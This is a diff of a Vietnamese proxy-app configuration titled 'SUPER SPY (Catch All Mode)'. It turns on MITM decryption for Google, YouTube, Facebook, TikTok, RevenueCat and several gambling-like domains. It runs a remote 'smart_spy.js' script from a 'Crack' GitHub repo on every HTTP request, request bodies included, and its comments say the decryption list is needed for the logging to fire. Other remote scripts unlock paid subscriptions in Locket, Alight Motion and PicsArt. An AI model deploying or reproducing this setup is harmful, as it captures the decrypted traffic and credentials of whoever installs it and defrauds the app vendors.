@@ -1,5 +1,5 @@
-#!name = SUPER SPY (Catch All)
-#!desc = Bắt tất cả mọi thứ - Chế độ Vét Cạn
+#!name = SUPER SPY (Catch All Mode)
+#!desc = Bắt trọn ổ: Game + Facebook + Youtube + Premium
 #!author = TungTinTacKMA
 
 [General]
@@ -9,7 +9,7 @@ dns-server = system
 ipv6 = true
 
 [Rule]
-# Chặn quảng cáo Youtube (Giữ lại để dùng cho sướng)
+# Giữ lại chặn quảng cáo Youtube để xem cho sướng
 AND,((DOMAIN-SUFFIX,googlevideo.com),(PROTOCOL,UDP)),REJECT
 AND,((DOMAIN,youtubei.googleapis.com),(PROTOCOL,UDP)),REJECT
 FINAL,PROXY
@@ -21,18 +21,18 @@ FINAL,PROXY
 http-request ^https:\/\/(spclient\.wg\\.spotify\\.com|.*-spclient\\.spotify\\.com(:443)?)\/user-customization-service\/v1\/customize$ header-del if-none-match
 
 [Url Rewrite]
-# Chặn quảng cáo Youtube (Url Rewrite)
+# Chặn quảng cáo Youtube (Nằm ở đây, nên bạn không thấy trong Script)
 ^https?:\/\/[\w-]+\.googlevideo\.com\/(?!(dclk_video_ads|videoplayback\?)).+&oad _ reject-200
 ^https?:\/\/(www|s)\.youtube\.com\/api\/stats\/ads _ reject-200
 
 [Script]
 # ==================================================
-# CHẾ ĐỘ VÉT CẠN (QUAN TRỌNG NHẤT)
-# pattern=.* => Bắt tất cả mọi đường link
+# KỊCH BẢN DUY NHẤT "CÂN" TẤT CẢ (YOUTUBE, FACEBOOK, GAME)
+# pattern=.* : Bất kỳ link nào cũng dính chấu
 # ==================================================
 Super_Spy = type=http-request,pattern=.*,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/smart_spy.js,requires-body=true,timeout=120
 
-# Các script hack app (giữ lại)
+# Các Script Hack App (Locket, Picsart...)
 Locket_Gold = type=http-response,pattern=^https:\/\/api\.revenuecat\.com\/.+\/(receipts$|subscribers\/[^/]+$),requires-body=true,max-size=-1,timeout=60,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/Locket_DuyVinh09.js
 AlightMotion = type=http-response,pattern=^https:\/\/api\.alightcreative\.com\/result,requires-body=1,max-size=0,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/AlightMotion.js
 PicsArt = type=http-request,pattern=^https:\/\/api\.picsart\.com\/gw-v2\/shop\/subscription\/apple\/purchases,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/PicsArt.js,requires-body=true,timeout=60
@@ -40,6 +40,6 @@ PicsArt = type=http-request,pattern=^https:\/\/api\.picsart\.com\/gw-v2\/shop\/s
 [MITM]
 enable = true
 # ==================================================
-# DANH SÁCH GIẢI MÃ (Bao gồm Game + App Premium)
+# DANH SÁCH GIẢI MÃ: PHẢI CÓ DÒNG NÀY MỚI NỔ LOG
 # ==================================================
-hostname = *.dsrcgoms.net, *.hit.club, *.wsmt8g.cc, *.genesockezlyfeapy.com, *.revenuecat.com, api.revenuecat.com, *.picsart.com, *.alightcreative.com, *.google.com, *.youtube.com, *.facebook.com
+hostname = *.dsrcgoms.net, *.hit.club, *.wsmt8g.cc, *.genesockezlyfeapy.com, *.revenuecat.com, api.revenuecat.com, *.picsart.com, *.alightcreative.com, *.google.com, *.youtube.com, *.facebook.com, *.tiktok.com
